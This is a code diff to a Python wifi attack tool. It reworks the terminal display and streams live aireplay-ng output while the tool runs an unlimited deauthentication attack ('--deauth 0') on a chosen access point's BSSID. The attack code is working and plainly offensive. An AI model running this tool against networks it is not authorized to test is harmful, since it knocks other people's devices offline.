@@ -72,9 +72,9 @@ def select_interface():
         raise banner.BackToMenu()
 
     print()
-    for index, item in enumerate(interfaces, start=1):
-        print(f"  {banner.C.CYAN}[{index}]{banner.C.RESET} {item}")
-    print(f"  {banner.C.CYAN}[q]{banner.C.RESET} exit")
+    lines = [f"{banner.C.CYAN}[{index}]{banner.C.RESET} {item}" for index, item in enumerate(interfaces, start=1)]
+    lines.append(f"{banner.C.CYAN}[q]{banner.C.RESET} exit")
+    banner.box(lines, title="available interfaces", accent=banner.C.CYAN)
 
     while True:
         choice = banner.prompt("interface", accent=banner.C.CYAN)
@@ -166,6 +166,10 @@ def _render_results_screen():
     if not active_wireless_network:
         lines.append(f"{banner.C.MUTED}no access points found{banner.C.RESET}")
 
+    lines.append("")
+    lines.append(f"{banner.C.CYAN}[r]{banner.C.RESET} scan again")
+    lines.append(f"{banner.C.CYAN}[q]{banner.C.RESET} exit")
+
     banner.box(lines, title="access points found", accent=banner.C.CYAN)
 
 
@@ -237,8 +241,6 @@ def scan_networks(interface):
 
 def select_target(mon_interface):
     while True:
-        print(f"  {banner.C.CYAN}[r]{banner.C.RESET} scan again")
-        print(f"  {banner.C.CYAN}[q]{banner.C.RESET} exit")
         choice = banner.prompt("target", accent=banner.C.CYAN)
         if choice.lower() in ("q", "b"):
             raise banner.BackToMenu()
@@ -250,6 +252,33 @@ def select_target(mon_interface):
             return active_wireless_network[int(choice)]
         except (ValueError, IndexError):
             banner.warn("invalid selection, try again")
+
+
+ATTACK_LOG_LINES = 12  # how many recent aireplay-ng lines stay visible in the box
+
+
+def _render_attack_screen(tick, target, log_lines):
+    banner.module_banner("wifi")
+    banner.section("deauthentication attack running", accent=banner.C.CYAN)
+
+    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
+
+    lines = [
+        f"target essid : {target['ESSID']}",
+        f"target bssid : {target['BSSID']}",
+        f"channel      : {target['channel'].strip()}",
+        "",
+        f"{spin}  sending deauth frames...",
+        "",
+    ]
+    if log_lines:
+        lines.extend(log_lines)
+    else:
+        lines.append(f"{banner.C.MUTED}waiting for aireplay-ng output...{banner.C.RESET}")
+    lines.append("")
+    lines.append(f"{banner.C.MUTED}press ctrl+c to stop{banner.C.RESET}")
+
+    banner.box(lines, title="aireplay-ng log", accent=banner.C.CYAN)
 
 
 def launch_attack(mon_interface, target):
@@ -267,7 +296,35 @@ def launch_attack(mon_interface, target):
     # otherwise aireplay-ng listens on whatever channel it was last left on
     # and never sees the target's beacon frames
     subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel])
-    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface])
+
+    attack_proc = subprocess.Popen(
+        ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1,
+    )
+
+    # tail the raw output into a fixed-size, boxed log instead of letting
+    # aireplay-ng's endless per-second lines scroll the whole terminal
+    log_lines = []
+    tick = 0
+    try:
+        for line in attack_proc.stdout:
+            line = line.rstrip("\n").strip()
+            if line:
+                log_lines.append(line)
+                del log_lines[:-ATTACK_LOG_LINES]
+            _render_attack_screen(tick, target, log_lines)
+            tick += 1
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if attack_proc.poll() is None:
+            attack_proc.terminate()
+        attack_proc.wait()
+
+    banner.warn("deauthentication attack stopped")
 
 
 def run():
